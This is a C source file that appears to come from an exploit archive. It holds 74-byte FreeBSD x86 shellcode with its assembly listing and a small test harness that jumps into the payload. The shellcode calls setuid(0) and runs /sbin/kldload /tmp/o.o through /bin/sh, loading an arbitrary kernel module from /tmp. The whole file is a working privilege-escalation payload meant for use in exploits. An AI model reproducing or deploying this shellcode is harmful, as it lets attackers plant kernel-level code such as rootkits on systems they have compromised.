/* The kldload shellcode
   setuid(0)
   loads /tmp/o.o kernel module

   Size 74 bytes
   OS   FreeBSD
                /rootteam/dev0id        (www.sysworld.net)
                        dev0id@uncompiled.com

BITS    32
jmp     short   callme
main:
        pop     esi
        xor     eax,eax
        mov     al,0x17
        push    eax
        int     0x80
        xor     eax,eax
        push    eax
        push long       0x68732f6e
        push long       0x69622f2f
        mov     ebx,esp
        push    eax
        push word       0x632d
        mov     edi,esp
        push    eax
        push    esi
        push    edi
        push    ebx
        mov     edi,esp
        push    eax
        push    edi
        push    ebx
        push    eax
        mov     al,0x3b
        int     0x80
callme:
        call    main
        db      '/sbin/kldload /tmp/o.o'
*/

char shellcode[] =
        "\xeb\x2c\x5e\x31\xc0\xb0\x17\x50\xcd\x80\x31\xc0\x50\x68\x6e"
        "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x66\x68\x2d\x63"
        "\x89\xe7\x50\x56\x57\x53\x89\xe7\x50\x57\x53\x50\xb0\x3b\xcd"
        "\x80\xe8\xcf\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x6b\x6c\x64"
        "\x6c\x6f\x61\x64\x20\x2f\x74\x6d\x70\x2f\x6f\x2e\x6f";

int
main(void)
{
        int *ret;
        ret = (int*)&ret+2;
        (*ret) = shellcode;
}





